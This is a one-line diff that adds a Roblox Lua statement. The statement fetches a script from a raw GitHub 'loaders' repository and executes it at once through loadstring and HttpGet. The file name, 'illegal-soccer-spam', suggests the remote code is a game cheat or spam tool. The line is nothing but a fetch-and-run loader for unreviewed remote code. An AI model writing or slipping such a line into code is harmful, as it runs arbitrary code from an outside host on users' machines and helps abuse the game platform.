@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/update-illegal-soccer-spam0-r7z7v93vijudtt.lua"))()
